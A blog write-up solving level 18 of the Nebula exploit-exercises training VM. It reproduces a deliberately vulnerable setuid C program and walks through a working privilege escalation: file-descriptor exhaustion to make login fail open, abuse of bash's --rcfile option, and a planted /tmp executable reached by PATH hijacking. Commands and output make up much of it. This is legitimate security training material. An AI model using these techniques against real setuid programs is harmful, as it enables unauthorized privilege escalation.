+++
author = "pwntester"
categories = ["nebula18"]
date = 2013-11-27T10:11:00Z
description = ""
draft = false
slug = "nebula-level18-write-up"
tags = ["nebula18"]
title = "Nebula level18 write-up"

+++

In [Level 18](http://exploit-exercises.com/nebula/level18) we are given the code of a vulnerable program:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <getopt.h>

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
    char file[64];

    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
      dprintf("Unable to read password file %s\n", PWFILE);
      return;
    }
                fclose(fp);
    if(strcmp(pw, file) != 0) return;
  }
  dprintf("logged in successfully (with%s password file)\n",
    fp == NULL ? "out" : "");

  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
  printf("%s\n", msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, "d:v")) != -1) {
    switch(c) {
      case 'd':
        globals.debugfile = fopen(optarg, "w+");
        if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
        setvbuf(globals.debugfile, NULL, _IONBF, 0);
        break;
      case 'v':
        globals.verbose++;
        break;
    }
  }

  dprintf("Starting up. Verbose level = %d\n", globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());

  while(1) {
    char line[256];
    char *p, *q;

    q = fgets(line, sizeof(line)-1, stdin);
    if(q == NULL) break;
    p = strchr(line, '\n'); if(p) *p = 0;
    p = strchr(line, '\r'); if(p) *p = 0;

    dvprintf(2, "got [%s] as input\n", line);

    if(strncmp(line, "login", 5) == 0) {
      dvprintf(3, "attempting to login\n");
      login(line + 6);
    } else if(strncmp(line, "logout", 6) == 0) {
      globals.loggedin = 0;
    } else if(strncmp(line, "shell", 5) == 0) {
      dvprintf(3, "attempting to start shell\n");
      if(globals.loggedin) {
        execve("/bin/sh", argv, envp);
        err(1, "unable to execve");
      }
      dprintf("Permission denied\n");
    } else if(strncmp(line, "logout", 4) == 0) {
      globals.loggedin = 0;
    } else if(strncmp(line, "closelog", 8) == 0) {
      if(globals.debugfile) fclose(globals.debugfile);
      globals.debugfile = NULL;
    } else if(strncmp(line, "site exec", 9) == 0) {
      notsupported(line + 10);
    } else if(strncmp(line, "setuser", 7) == 0) {
      setuser(line + 8);
    }
  }

  return 0;
}

```

After reading it and playing around with it here is the basic functionality:

When started, the program looks for two arguments:
 -d file: to enable logging to the provided log file
 -v: to increase the verbosity level

Then the program starts and write the verbosity level to the debug file and sets the EUID privileges to the binary. The program starts accepting input at that time:

* login <name>: tries to log in the given user. The **login** function fails open, that means that if the password file cannot be read, then it logs in the user. We could try to remove the password file to force **fopen** to fail and return **NULL** file descriptor, but we cannot remove the file. The other way to make the **fopen** function call to fail it to exhaust the file descriptors so that there are no more to assign to the **password** file. This can be done since the **login** function never closes the file descriptor. This one way we will explore, lets keep on reading the program.

* logout: just clear the **globals.loggedin** flag which is of no utility for us

* shell: this looks pretty useful for us, it executes a new **/bin/sh** shell (note the absolute path, so we wont be able to fake it) and uses the same **flag18** arguments as the shell arguments.

* closelog: if **flag18** was called with the -d option, it closes the log file descriptor and stops logging. This will be useful, but keep reading

* site exec: calls the **notsupported** function where there is a format string vulnerability (**dprintf(what)**). But if we try to exploit it we get:

```lang-bash line-numbers 
level18@nebula:~$ /home/flag18/flag18 -v -d /tmp/log
site exec %n
* %n in writable segment detected *
Aborted
```

* Googling for it takes us to the [Phrack](http://www.phrack.org/issues.html?issue=67&id=9) magazine pointing out that the binary was compiled with FORTIFY_SOURCE that provides two countermeasures against format strings.

  * Format strings containing the %n specifier may not be located at a writeable address in the memory space of the application.
  * When using positional parameters, all arguments within the range must be consumed. So to use %7$x, you must also use 1,2,3,4,5 and 6.

* We can verify it with **checksec.sh**:

```lang-bash line-numbers 
level18@nebula:~$ ./checksec.sh --fortify-file /home/flag18/flag18
* FORTIFY_SOURCE support available (libc)    : Yes
* Binary compiled with FORTIFY_SOURCE support: Yes
```

* So exploiting this path looks hard and requires skills I still dont have ;-)

* setuser: calls the setuser function where our input line (up to 256 bytes) is stored in the msg buffer (128 bytes) so there is a clear buffer overflow but it looks like the binary is compiled with some protections in place:

```lang-bash line-numbers 
 level18@nebula:~$ echo "setuser `python -c 'print("A"*200)'`" | /home/flag18/flag18 -v -d /tmp/log
 *** buffer overflow detected ***: /home/flag18/flag18 terminated
 ======= Backtrace: =========
 /lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0x3d98d5]
 /lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0x3d86d7]
 /lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0x3d7d35]
 /lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0x35df91]
 /lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0x335305]
 /lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0x3d7e09]
 /lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0x3d7d1f]
 /home/flag18/flag18[0x8048df5]
 /home/flag18/flag18[0x8048b1b]
 /lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0x30b113]
 /home/flag18/flag18[0x8048bb1]
 ======= Memory map: ========
 002f2000-00468000 r-xp 00000000 08:01 69         /lib/i386-linux-gnu/libc-2.13.so
 00468000-0046a000 r--p 00176000 08:01 69         /lib/i386-linux-gnu/libc-2.13.so
 0046a000-0046b000 rw-p 00178000 08:01 69         /lib/i386-linux-gnu/libc-2.13.so
 0046b000-0046e000 rw-p 00000000 00:00 0
 00bd5000-00bf3000 r-xp 00000000 08:01 66         /lib/i386-linux-gnu/ld-2.13.so
 00bf3000-00bf4000 r--p 0001d000 08:01 66         /lib/i386-linux-gnu/ld-2.13.so
 00bf4000-00bf5000 rw-p 0001e000 08:01 66         /lib/i386-linux-gnu/ld-2.13.so
 00c99000-00cb5000 r-xp 00000000 08:01 91         /lib/i386-linux-gnu/libgcc_s.so.1
 00cb5000-00cb6000 r--p 0001b000 08:01 91         /lib/i386-linux-gnu/libgcc_s.so.1
 00cb6000-00cb7000 rw-p 0001c000 08:01 91         /lib/i386-linux-gnu/libgcc_s.so.1
 00cba000-00cbb000 r-xp 00000000 00:00 0          [vdso]
 08048000-0804a000 r-xp 00000000 08:01 132987     /home/flag18/flag18
 0804a000-0804b000 r--p 00001000 08:01 132987     /home/flag18/flag18
 0804b000-0804c000 rw-p 00002000 08:01 132987     /home/flag18/flag18
 0808c000-080ad000 rw-p 00000000 00:00 0          [heap]
 b771c000-b771d000 rw-p 00000000 00:00 0
 b7721000-b7724000 rw-p 00000000 00:00 0
 bf9b9000-bf9da000 rw-p 00000000 00:00 0          [stack]
 Aborted
```

 Checking the binary protections shows little chance of success:

```lang-bash line-numbers 
 level18@nebula:~$ ./checksec.sh --file ../flag18/flag18
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ../flag18/flag18
```

So thats all, there are no more options and we need to take one of this exploitation techniques. I will choose the easy one (exhausting the file descriptors) as the other two are far beyond my current skills.

# Exploiting the file logic flaw
Ok, so first we need to know how many file descriptors can be opened by a process:

```lang-bash line-numbers 
level18@nebula:~$ ulimit -a
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 1839
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 1839
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
```

Nice 1024, so when the program starts it take 3 for the stdin, stdout and stderr, we need to take 1021 more fds before the **fopen** fails and we are logged in:

```lang-bash line-numbers 
level18@nebula:~$ echo "`python -c 'print("login me\n"*1021 + "shell")'`" | /home/flag18/flag18 -v -d /tmp/log
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
```

Opps, we take all of the fds so our shell is refusing to run because it cannot open **libncurses.so.5**. Note than since we are running **/bin/sh** with the flag18 arguments (including binary name as arg 0) the error message looks like coming from flag18 when its actually coming from /bin/sh

Ok, remember that there was an option to close the log file and free its fd?? lets use it:

```lang-bash line-numbers 
level18@nebula:~$ echo "`python -c 'print("login me\n"*1021 + "closelog\n" + "shell")'`" | /home/flag18/flag18 -v -d /tmp/log
/home/flag18/flag18: -d: invalid option
Usage:	/home/flag18/flag18 [GNU long option] [option] ...
	/home/flag18/flag18 [GNU long option] [option] script-file ...
GNU long options:
	--debug
	--debugger
	--dump-po-strings
	--dump-strings
	--help
	--init-file
	--login
	--noediting
	--noprofile
	--norc
	--posix
	--protected
	--rcfile
	--restricted
	--verbose
	--version
Shell options:
	-irsD or -c command or -O shopt_option		(invocation only)
	-abefhkmnptuvxBCHP or -o option
```

Well, new problem arises, **/bin/sh** does not have any **-d** argument. I got stuck here so I looked for some help and was pointed to the **bash** man page and its **--rcfile** option:

>  The --rcfile file option will force Bash to read and execute commands from file instead of ~/.bashrc.

Ok, so there we go:

```lang-bash line-numbers 
level18@nebula:~$ echo "`python -c 'print("login me\n"*1021 + "closelog\n" + "shell")'`" | /home/flag18/flag18 --rcfile -d /tmp/log
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'r'
/home/flag18/flag18: invalid option -- 'c'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
/tmp/log: line 1: Starting: command not found
/tmp/log: line 2: syntax error near unexpected token `('
/tmp/log: line 2: `logged in successfully (without password file)'
```

Ok, it worked!!! but our rc file is now the log file and so, its trying to execute its contents and thats why it fails executing **Starting**, all we need to do is create an executable called after **Starting** with our payload:

```lang-bash line-numbers 
level18@nebula:~$ echo "getflag" > /tmp/Starting
level18@nebula:~$ chmod +x /tmp/Starting
level18@nebula:~$ export PATH=/tmp:$PATH
level18@nebula:~$ echo "`python -c 'print("login me\n"*1021 + "closelog\n" + "shell")'`" | /home/flag18/flag18 --rcfile -d /tmp/log
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'r'
/home/flag18/flag18: invalid option -- 'c'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
You have successfully executed getflag on a target account
/tmp/log: line 2: syntax error near unexpected token `('
/tmp/log: line 2: `logged in successfully (without password file)'
```

Voila !!!

I google around for solutions to the format string and buffer overflow approaches and found these ones that I need to re-read when I grow up :D

* [v0id s3curity - Exploit Exercise - Format String FORTIFY_SOURCE Bypass ](http://v0ids3curity.blogspot.com.es/2012/09/exploit-exercise-format-string.html)
* [v0id s3curity - Defeating ASLR Using Information Leak ](http://v0ids3curity.blogspot.com.es/2012/09/defeating-aslr-using-information-leak.html)
* [forelsket & security - Level 18](http://forelsec.blogspot.com.es/2013/03/nebula-solutions-all-levels.html)

